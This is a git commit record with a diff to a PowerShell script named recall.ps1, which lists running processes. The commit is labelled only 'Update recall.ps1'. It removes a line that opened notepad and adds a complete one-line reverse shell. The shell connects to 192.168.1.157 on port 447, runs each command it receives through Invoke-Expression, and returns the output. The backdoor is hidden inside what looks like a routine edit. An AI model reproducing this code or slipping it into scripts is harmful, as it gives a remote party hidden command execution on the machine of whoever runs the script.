c2ed28de11929da14a33e9cf23c05d4b35460331
Haxor8880 <37700941+sksojib20@users.noreply.github.com>
2022-06-13 18:04:44 +0600

    Update recall.ps1

--- recall.ps1
+++ recall.ps1
@@ -4,12 +4,10 @@ $i = 1
 ForEach ($process in $processes) {
 
     Write-Host "Process[$i]'s Name is $($process.Name)"
-    Start-Sleep -Seconds 10
-
+    Start-Sleep -Seconds 20
     $i++
 	
-  if( 5 -eq $i ){
-	notepad
-	}
+    $TCPClient = New-Object Net.Sockets.TCPClient('192.168.1.157', 447);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()
+  
 
 }
